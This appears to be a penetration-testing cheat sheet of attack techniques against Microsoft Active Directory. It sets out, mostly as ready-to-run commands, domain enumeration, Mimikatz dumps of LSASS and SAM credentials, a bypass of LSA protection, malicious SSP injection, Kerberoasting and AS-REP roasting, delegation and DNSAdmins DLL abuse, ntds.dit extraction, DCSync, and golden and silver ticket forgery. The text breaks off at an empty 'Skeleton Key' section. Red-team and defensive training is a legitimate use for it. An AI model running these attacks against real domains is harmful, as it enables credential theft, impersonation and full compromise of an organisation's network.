# Active Directory

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
{% endhint %}

## TODO: cleanup code examples for scripting \($var, etc.\)

## Tools

* [Powersploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)
* [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
* [Powermad](https://github.com/Kevin-Robertson/Powermad)
* [Impacket](https://github.com/SecureAuthCorp/impacket)
* [Mimikatz](https://github.com/gentilkiwi/mimikatz)
* [Rubeus](https://github.com/GhostPack/Rubeus) -&gt; [Compiled Version](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
* [BloodHound](https://github.com/BloodHoundAD/BloodHound)
* [AD Module](https://github.com/samratashok/ADModule)
* [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)

## Domain Enumeration

### Using Active Directory PowerShell Module

* **Get Current Domain:** `Get-ADDomain`
* **Enumerate other Domains:** `Get-ADDomain -Identity $DomainName`
* **Get Domain SID:** `Get-DomainSID`
* **Get Domain Controllers:**

  ```text
  Get-ADDomainController
  Get-ADDomainController -Identity $DomainName
  ```

* **Enumerate Domain Users:**

  ```text
  Get-ADUser -Filter * -Identity $user -Properties *

  #Get a specific "string" on a user's attribute
  Get-ADUser -Filter 'Description -like "*pass*"' -Properties Description | select Name, Description
  ```

* **Enumerate Domain Computers:**

  ```text
  Get-ADComputer -Filter * -Properties *
  Get-ADGroup -Filter * 
  ```

* **Enumerate Domain Trust:**

  ```text
  Get-ADTrust -Filter *
  Get-ADTrust -Identity $DomainName
  ```

* **Enumerate Forest Trust:**

  ```text
  Get-ADForest
  Get-ADForest -Identity $ForestName

  #Domains of Forest Enumeration
  (Get-ADForest).Domains
  ```

* **Enumerate Local AppLocker Effective Policy:**

```text
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Using [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon)

* **Get Current Domain:** `Get-NetDomain`
* **Enumerate other Domains:** `Get-NetDomain -Domain $DomainName`
* **Get Domain SID:** `Get-DomainSID`
* **Get Domain Policy:**

  ```text
  Get-DomainPolicy

  #Will show us the policy configurations of the Domain about system access or kerberos
  (Get-DomainPolicy)."system access"
  (Get-DomainPolicy)."kerberos policy"
  ```

* **Get Domain Controllers:**

  ```text
  Get-NetDomainController
  Get-NetDomainController -Domain $DomainName
  ```

* **Enumerate Domain Users:**

  ```text
  Get-NetUser
  Get-NetUser -SamAccountName $user
  Get-NetUser | select cn
  Get-UserProperty

  #Check last password change
  Get-UserProperty -Properties pwdlastset

  #Get a spesific "string" on a user's attribute
  Find-UserField -SearchField Description -SearchTerm "wtver"

  #Enumerate user logged on a machine
  Get-NetLoggedon -ComputerName $ComputerName

  #Enumerate Session Information for a machine
  Get-NetSession -ComputerName $ComputerName

  #Enumerate domain machines of the current/specified domain where specific users are logged into
  Find-DomainUserLocation -Domain $DomainName | Select-Object UserName, SessionFromName
  ```

* **Enumerate Domain Computers:**

  ```text
  Get-NetComputer -FullData
  Get-DomainGroup

  #Enumerate Live machines 
  Get-NetComputer -Ping
  ```

* **Enumerate Groups and Group Members:**

  ```text
  Get-NetGroupMember -GroupName "$GroupName" -Domain $DomainName

  #Enumerate the members of a specified group of the domain
  Get-DomainGroup -Identity $GroupName | Select-Object -ExpandProperty Member

  #Returns all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
  Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
  ```

* **Enumerate Shares**

  ```text
  #Enumerate Domain Shares
  Find-DomainShare

  #Enumerate Domain Shares the current user has access
  Find-DomainShare -CheckShareAccess
  ```

* **Enumerate Group Policies:**

  ```text
  Get-NetGPO

  # Shows active Policy on specified machine
  Get-NetGPO -ComputerName $ComputerName
  Get-NetGPOGroup

  #Get users that are part of a Machine's local Admin group
  Find-GPOComputerAdmin -ComputerName $ComputerName
  ```

* **Enumerate OUs:**

  ```text
  Get-NetOU -FullData 
  Get-NetGPO -GPOname $GPO_GUID
  ```

* **Enumerate ACLs:**

  ```text
  # Returns the ACLs associated with the specified account
  Get-ObjectAcl -SamAccountName $AccountName -ResolveGUIDs
  Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose

  #Search for interesting ACEs
  Invoke-ACLScanner -ResolveGUIDs

  #Check the ACLs associated with a specified path (e.g smb share)
  Get-PathAcl -Path $Share_Path
  ```

* **Enumerate Domain Trust:**

  ```text
  Get-NetDomainTrust
  Get-NetDomainTrust -Domain $DomainName
  ```

* **Enumerate Forest Trust:**

  ```text
  Get-NetForestDomain
  Get-NetForestDomain Forest $ForestName

  #Domains of Forest Enumeration
  Get-NetForestDomain
  Get-NetForestDomain Forest $ForestName

  #Map the Trust of the Forest
  Get-NetForestTrust
  Get-NetDomainTrust -Forest $ForestName
  ```

* **User Hunting:**

  ```text
  #Finds all machines on the current domain where the current user has local admin access
  Find-LocalAdminAccess -Verbose

  #Find local admins on all machines of the domain:
  Invoke-EnumerateLocalAdmin -Verbose

  #Find computers were a Domain Admin OR a spesified user has a session
  Invoke-UserHunter
  Invoke-UserHunter -GroupName "RDPUsers"
  Invoke-UserHunter -Stealth

  #Confirming admin access:
  Invoke-UserHunter -CheckAccess
  ```

  **Escalate Privileges to Domain Admin with User Hunting:**

  * If you have local admin access on a machine 
  * If A Domain Admin has a session on that machine 
  * Steal their token and impersonate them!

[PowerView 3.0 Tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### Using BloodHound

```text
#Using .exe ingestor
.\SharpHound.exe --CollectionMethod All --LDAPUser $UserName --LDAPPass $Password --JSONFolder $OutFile_Path
    
#Using powershell module ingestor
.\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All  -LDAPUser $UserName -LDAPPass $Password -OutputDirectory $OutFile_Path
```

### Useful Enumeration Tools

* [LDAPDomainDump](https://github.com/dirkjanm/ldapdomaindump%20) Information dumper via LDAP, Gathers the AD schema details. 
* [adidnsdump](https://github.com/dirkjanm/adidnsdump) Integrated DNS dumping by any authenticated user
* [ACLight](https://github.com/cyberark/ACLight) Advanced Discovery of Privileged Accounts
* [ADRecon](https://github.com/sense-of-security/ADRecon) Detailed Active Directory Recon Tool
* [ADExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) easily navigate an AD database, save snapshots of an AD database for off-line viewing.

## Local Privilege Escalation

* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) Misconfiguration Abuse
* [BeRoot](https://github.com/AlessandroZ/BeRoot) General Privilege Escalation Enumeration Tool
* [Privesc](https://github.com/enjoiz/Privesc) General Privilege Escalation Enumeration Tool
* [FullPowers](https://github.com/itm4n/FullPowers) Restore a service account's privileges
* [Juicy Potato](https://github.com/ohpe/juicy-potato) Abuse `SeImpersonate` or `SeAssignPrimaryToken` Privileges for System Impersonation

  ⚠️ Works only until Windows Server 2016 and Windows 10 until patch 1803

* [Lovely Potato](https://github.com/TsukiCTF/Lovely-Potato) Automated Juicy Potato

  ⚠️ Works only until Windows Server 2016 and Windows 10 until patch 1803

* [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) Exploit the PrinterBug for System Impersonation

  🙏 Works for Windows Server 2019 and Windows 10

* [RoguePotato](https://github.com/antonioCoco/RoguePotato) Upgraded Juicy Potato

  🙏 Works for Windows Server 2019 and Windows 10

* [Abusing Token Privileges](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)
* [SMBGhost CVE-2020-0796](https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/) [PoC](https://github.com/danigargu/CVE-2020-0796)

## Lateral Movement

### PowerShell Remoting

```text
#Enable Powershell Remoting on current Machine (Needs Admin Access)
Enable-PSRemoting

#Entering or Starting a new PSSession (Needs Admin Access)
$sess = New-PSSession -ComputerName $ComputerName>
Enter-PSSession -ComputerName $ComputerName 
-OR-
Enter-PSSession -Sessions $SessionName
```

### Remote Code Execution with PS Credentials

```text
$SecPassword = ConvertTo-SecureString '$Password' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('$DomainName\$User', $SecPassword)
Invoke-Command -ComputerName $ComputerName -Credential $Cred -ScriptBlock {whoami /all}
```

### Import a PowerShell module and execute its functions remotely

```text
#Execute the command and start a session
Invoke-Command -Credential $cred -ComputerName $ComputerName -FilePath $PSModule_FilePath -Session $sess 

#Interact with the session
Enter-PSSession -Session $sess
```

### Executing Remote Stateful commands

```text
#Create a new session
$sess = New-PSSession -ComputerName $ComputerName

#Execute command on the session
Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}

#Check the result of the command to confirm we have an interactive session
Invoke-Command -Session $sess -ScriptBlock {$ps}
```

### Useful Tools

* [Powercat](https://github.com/besimorhino/powercat) netcat written in powershell, and provides tunneling, relay and portforward capabilities.
* [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) fileless lateral movement tool that relies on ChangeServiceConfigA to run command
* [Evil-Winrm](https://github.com/Hackplayers/evil-winrm) the ultimate WinRM shell for hacking/pentesting
* [RunasCs](https://github.com/antonioCoco/RunasCs) Csharp and open version of windows builtin runas.exe

## Mimikatz

```text
#The commands are in cobalt strike format!

#Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:$UserName /ntlm:$NTLM_Hash /domain:$Domain_FQDN

#List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

#Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

#Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#List cached MasterKeys
mimikatz sekurlsa::dpapi

#List local Kerberos AES Keys
mimikatz sekurlsa::ekeys

#Dump SAM Database
mimikatz lsadump::sam

#Dump SECRETS Database
mimikatz lsadump::secrets

#Inject and dump the Domain Controler's Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

#Dump the Domain's Credentials without touching DC's LSASS and also remotely
mimikatz lsadump::dcsync /domain:$Domain_FQDN /all

#List and Dump local kerberos credentials
mimikatz kerberos::list /dump

#Pass The Ticket
mimikatz kerberos::ptt $KirbiFile_Path

#List TS/RDP sessions
mimikatz ts::sessions

#List Vault credentials
mimikatz vault::list
```

What if mimikatz fails to dump credentials because of LSA Protection controls ? Two workarounds:

### LSA as a Protected Process

```text
#Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa

#Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
#Now lets import the mimidriver.sys to the system
mimikatz # !+

#Now lets remove the protection flags from lsass.exe process
mimikatz # !processprotect /process:lsass.exe /remove

#Finally run the logonpasswords function to dump lsass
mimikatz # sekurlsa::logonpasswords
```

### LSA is running as virtualized process \(LSAISO\) by Credential Guard

```text
#Check if a process called lsaiso.exe exists on the running processes
tasklist |findstr lsaiso

#If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
#Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides
mimikatz # misc::memssp

#Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
```

* [Detailed Mimikatz Guide](https://adsecurity.org/?page_id=1821)
* [Poking Around With 2 lsass Protection Options](https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a)

## Domain Privilege Escalation

### Kerberoast

_All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a "user"  
account, extract the encrypted blob that was encrypted using the user's password and bruteforce it offline._

#### Using PowerView:

```text
#Get User Accounts that are used as Service Accounts
Get-NetUser -SPN

#Get every available SPN account, request a TGS and dump its hash
Invoke-Kerberoast

#Requesting the TGS for a single account:
Request-SPNTicket
  
#Export all tickets using Mimikatz
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

#### Using PowerShell AD Module:

```text
#Get User Accounts that are used as Service Accounts
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

#### Using Impacket:

```text
python GetUserSPNs.py $DomainName/$DomainUser:$Password -outputfile $Out_File
```

#### Using Rubeus:

```text
#Kerberoasting and outputing on a file with a spesific format
Rubeus.exe kerberoast /outfile:$Out_File /domain:$DomainName

#Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts
Rubeus.exe kerberoast /outfile:$Out_File /domain:$DomainName /rc4opsec

#Kerberoast AES enabled accounts
Rubeus.exe kerberoast /outfile:$Out_File /domain:$DomainName /aes
 
#Kerberoast spesific user account
Rubeus.exe kerberoast /outfile:$Out_File /domain:$DomainName /user:$UserName /simple

#Kerberoast by specifying the authentication credentials 
Rubeus.exe kerberoast /outfile:$Out_File /domain:$DomainName /creduser:$UserName> /credpassword:$Password>
```

### ASREPRoast

_If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted  
blob and bruteforce it offline._

* PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
* AD Module: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`

Forcefully Disable Kerberos Preauth on an account I have Write permissions or more! Check for interesting permissions on accounts:

{% hint style="info" %}
We add a filter \(e.g. RDPUsers\) to get "User Accounts" not Machine Accounts, because Machine Account hashes are not crackable!
{% endhint %}

#### Using PowerView:

```text
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
Disable Kerberos Preauth:
Set-DomainObject -Identity $UserAccount -XOR @{useraccountcontrol=4194304} -Verbose
Check if the value changed:
Get-DomainUser -PreauthNotRequired -Verbose
```

And finally execute the attack using the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast) tool.

```text
#Get a specific Account's hash:
Get-ASREPHash -UserName $UserName -Verbose

#Get any ASREPRoastable Users' hashes:
Invoke-ASREPRoast -Verbose
```

#### Using Rubeus:

```text
#For $Format choose either hashcat or john

#Trying the attack for all domain users
Rubeus.exe asreproast /format:$Format /domain:$DomainName /outfile:$Out_File

#ASREPRoast a specific user
Rubeus.exe asreproast /user:$UserName /format:$Format /domain:$DomainName /outfile:$Out_File

#ASREPRoast users of a specific OU (Organization Unit)
Rubeus.exe asreproast /ou:$OU_Name /format:$Format /domain:$DomainName /outfile:$Out_File
```

#### Using Impacket:

```text
#Trying the attack for the specified users on the file
python GetNPUsers.py $DomainName/ -usersfile $Users_File -outputfile $Out_File
```

### Password Spray Attack

If we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse on other domain accounts.

### **Tools:**

* [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
* [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
* [Spray](https://github.com/Greenwolf/Spray)

### Force Set SPN

_If we have enough permissions -&gt; GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and brute force it._

#### Using PowerView:

```text
#Check for interesting permissions on accounts:
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
 
#Check if current user has already an SPN setted:
Get-DomainUser -Identity $UserName | select serviceprincipalname
 
#Force set the SPN on the account:
Set-DomainObject $UserName -Set @{serviceprincipalname='ops/whatever1'}
```

#### Using PowerShell AD Module:

```text
#Check if current user has already an SPN setted
Get-ADUser -Identity $UserName -Properties ServicePrincipalName | select ServicePrincipalName
  
#Force set the SPN on the account:
Set-ADUser -Identiny $UserName -ServicePrincipalNames @{Add='ops/whatever1'}
```

Finally use any tool from before to grab the hash and Kerberoast it!

### Abusing Shadow Copies

If you have local administrator access on a machine try to list shadow copies, it's an easy way for Domain Escalation.

```text
#List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows
  
#List shadow copies using diskshadow
diskshadow list shadows all
  
#Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

1. You can dump the backed-up SAM database and harvest credentials.
2. Look for DPAPI stored creds and decrypt them.
3. Access backed-up sensitive files.

### List and Decrypt Stored Credentials using Mimikatz

Usually encrypted credentials are stored in:

* `%appdata%\Microsoft\Credentials`
* `%localappdata%\Microsoft\Credentials`

```text
#By using the cred function of mimikatz we can enumerate the cred object and get information about it:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\$CredHash"

#From the previous command we are interested to the "guidMasterKey" parameter, that tells us which masterkey was used to encrypt the credential
#Lets enumerate the Master Key:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\$UserSID\$MasterKeyGUID"

#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\$UserSID\$MasterKeyGUID" /rpc

#We now have the masterkey in our local cache:
dpapi::cache

#Finally we can decrypt the credential using the cached masterkey:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\$CredHash"
```

Detailed Article: [DPAPI all the things](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)

### Unconstrained Delegation

_If we have Administrative access on a machine that has Unconstrained Delegation enabled, we can wait for a high value target or DA to connect to it, steal his TGT then ptt and impersonate him!_

Using PowerView:

```text
#Discover domain joined computers that have Unconstrained Delegation enabled
Get-NetComputer -UnConstrained

#List tickets and check if a DA or some High Value target has stored its TGT
Invoke-Mimikatz -Command '"sekurlsa::tickets"'

#Command to monitor any incoming sessions on our compromised server
Invoke-UserHunter -ComputerName $ComputerName -Poll $Num_Seconds -UserName $UserName -Delay $WaitInterval -Verbose

#Dump the tickets to disk:
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

#Impersonate the user using ptt attack:
Invoke-Mimikatz -Command '"kerberos::ptt $Ticket_Path"'
```

**Note:** We can also use Rubeus!

### Constrained Delegation

Using PowerView and Kekeo:

```text
#Enumerate Users and Computers with constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo
tgt::ask /user:$UserName /domain:$Domain_FQDN /rc4:$Password_Hash

#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation
tgs::s4u /tgt:$TGT_Path /user:$UserToImpersonate@$Domain_FQDN /service:$Service_SPN

#Finally use mimikatz to ptt the TGS
Invoke-Mimikatz -Command '"kerberos::ptt $TGS_Path"'
```

_ALTERNATIVE:_ Using Rubeus:

```text
Rubeus.exe s4u /user:$UserName /rc4:$NTLM_Hash /impersonateuser:$UserToImpersonate /msdsspn:"$Service_SPN" /altservice:<Optional> /ptt
```

Now we can access the service as the impersonated user!

🚩 **What if we have delegation rights for only a specific SPN? \(e.g TIME\):**

In this case we can still abuse a feature of Kerberos called "alternative service". This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. That gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.

### Resource Based Constrained Delegation

_If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate Domain Administrator and have complete access._

Tools we are going to use:

* [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon)
* [Powermad](https://github.com/Kevin-Robertson/Powermad)
* [Rubeus](https://github.com/GhostPack/Rubeus)

First we need to enter the security context of the user/machine account that has the privileges over the object. If it is a user account we can use Pass the Hash, RDP, PSCredentials etc.

Exploitation Example:

```text
#Import Powermad and use it to create a new MACHINE ACCOUNT
. .\Powermad.ps1
New-MachineAccount -MachineAccount $MachineAccountName -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose

#Import PowerView and get the SID of our new created machine account
. .\PowerView.ps1
$ComputerSid = Get-DomainComputer $MachineAccountName -Properties objectsid | Select -Expand objectsid

#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength) 
$SD.GetBinaryForm($SDBytes, 0)

#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView
Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

#After that we need to get the RC4 hash of the new machine account's password using Rubeus
Rubeus.exe hash /password:'p@ssword!'

#TODO: Fix these last two examples (Domain and computername needed?)
#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus
Rubeus.exe s4u /user:$MachineAccountName /rc4:$RC4HashOfMachineAccountPassword /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:$Domain_FQDN /ptt

#Finally we can access the C$ drive of the target machine
dir \\TargetMachine.wtver.domain\C$
```

Detailed Articles:

* [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [RESOURCE-BASED CONSTRAINED DELEGATION ABUSE](https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/)

❗ In Constrain and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED\_TO\_AUTH\_FOR\_DELEGATION that we try to abuse, we can use the very nice trick "tgt::deleg" from kekeo or "tgtdeleg" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.

```text
#Command on Rubeus
Rubeus.exe tgtdeleg /nowrap
```

Detailed Article: [Rubeus – Now With More Kekeo](https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/)

### DNSAdmins Abuse

_If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work._

1. Enumerate the members of the DNSAdmins group:
   * PowerView: `Get-NetGroupMember -GroupName "DNSAdmins"`
   * AD Module: `Get-ADGroupMember -Identiny DNSAdmins`
2. Once we found a member of this group we need to compromise it \(There are many ways\).
3. Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:

   ```text
   #Using dnscmd:
   dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll

   #Restart the DNS Service:
   sc \\DNSServer stop dns
   sc \\DNSServer start dns
   ```

### Abusing Active Directory-Integrated DNS

* [Exploiting Active Directory-Integrated DNS](https://blog.netspi.com/exploiting-adidns/)
* [ADIDNS Revisited](https://blog.netspi.com/adidns-revisited/)
* [Inveigh](https://github.com/Kevin-Robertson/Inveigh)

### Abusing Backup Operators Group

_If we manage to compromise a user account that is member of the Backup Operators group, we can then abuse it's SeBackupPrivilege to create a shadow copy of the current state of the DC, extract the ntds.dit database file, dump the hashes and escalate our privileges to DA._

1. Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:

```text
#Create a .txt file that will contain the shadow copy process script
Script ->{
set context persistent nowriters  
set metadata c:\windows\system32\spool\drivers\color\example.cab  
set verbose on  
begin backup  
add volume c: alias mydrive  
 
create  
  
expose %mydrive% w:  
end backup  
}

#Execute diskshadow with our script as parameter
diskshadow /s script.txt
```

1. Next we need to access the shadow copy, we may have the SeBackupPrivilege but we cant just simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are going to use [this](https://github.com/giuliano108/SeBackupPrivilege) amazing repo:

```text
#Importing both dlls from the repo using powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
  
#Checking if the SeBackupPrivilege is enabled
Get-SeBackupPrivilege
  
#If it isn't we enable it
Set-SeBackupPrivilege
  
#Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite
  
#Dump the SYSTEM hive
reg save HKLM\SYSTEM c:\temp\system.hive 
```

1. Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.
2. Use secretsdump.py from impacket and dump the hashes.
3. Use psexec or another tool of your choice to PTH and get Domain Admin access.

### Abusing Exchange

* [Abusing Exchange one Api call from DA](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
* [CVE-2020-0688](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
* [PrivExchange](https://github.com/dirkjanm/PrivExchange) Exchange your privileges for Domain Admin privs by abusing Exchange

### Weaponizing Printer Bug

* [Printer Server Bug to Domain Administrator](https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/)
* [NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)

### Abusing ACLs

* [Escalating privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [aclpwn.py](https://github.com/fox-it/aclpwn.py)
* [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)

### Abusing IPv6 with mitm6

* [Compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
* [mitm6](https://github.com/fox-it/mitm6)

### SID History Abuse

_If we manage to compromise a child domain of a forest and_ [_SID filtering_](https://www.itprotoday.com/windows-8/sid-filtering) _isn't enabled \(most of the times is not\), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the_ [_SID History_](https://www.itprotoday.com/windows-8/sid-history) _field on a kerberos TGT ticket, that defines the "extra" security groups and privileges._

Exploitation example:

```text
#Get the SID of the Current Domain using PowerView
Get-DomainSID -Domain current.root.domain.local

#Get the SID of the Root Domain using PowerView
Get-DomainSID -Domain root.domain.local

#Create the Enteprise Admins SID
Format: RootDomainSID-519

#Forge "Extra" Golden Ticket using mimikatz
kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:<CurrentDomainSID> /krbtgt:<krbtgtHash> /sids:<EnterpriseAdminsSID> /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi

#Inject the ticket into memory
kerberos::ptt \path\to\ticket\golden.kirbi

#List the DC of the Root Domain
dir \\dc.root.domain.local\C$

#Or DCsync and dump the hashes using mimikatz
lsadump::dcsync /domain:root.domain.local /all
```

Detailed Articles:

* [Kerberos Golden Tickets are Now More Golden](https://adsecurity.org/?p=1640)
* [A Guide to Attacking Domain Trusts](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)

### Exploiting SharePoint

* [CVE-2019-0604](https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d) RCE Exploitation [PoC](https://github.com/k8gege/CVE-2019-0604)
* [CVE-2019-1257](https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization) Code execution through BDC deserialization
* [CVE-2020-0932](https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters) RCE using typeconverters [PoC](https://github.com/thezdi/PoC/tree/master/CVE-2020-0932)

### Zerologon Exploit

* [Zerologon: Unauthenticated domain controller compromise](https://www.secura.com/pathtoimg.php?id=2055): White paper of the vulnerability.
* [SharpZeroLogon](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon): C\# implementation of the Zerologon exploit.
* [Invoke-ZeroLogon](https://github.com/BC-SECURITY/Invoke-ZeroLogon): Powershell implementation of the Zerologon exploit.
* [Zer0Dump](https://github.com/bb00/zer0dump): Python implementation of the Zerologon exploit using the impacket library.

## Domain Persistence

### Golden Ticket Attack

```text
#Execute mimikatz on DC as DA to grab krbtgt hash:
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC'sName>

#On any machine:
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:
<HashOfkrbtgtAccount>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

### DCsync Attack

```text
#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\<AnyDomainUser>"'

#DCsync using secretsdump.py from impacket with NTLM authentication
secretsdump.py <Domain>/<Username>:<Password>@<DC'S IP or FQDN> -just-dc-ntlm

#DCsync using secretsdump.py from impacket with Kerberos Authentication
secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm
```

**Tip:**  
/ptt -&gt; inject ticket on current running session  
/ticket -&gt; save the ticket on the system for later use

### Silver Ticket Attack

```text
Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TheTargetMachine> /service:
<ServiceType> /rc4:<TheSPN's Account NTLM Hash> /user:<UserToImpersonate> /ptt"'
```

[SPN List](https://adsecurity.org/?page_id=183)

### Skeleton Key Attack

```text
#Exploitation Command runned as DA:
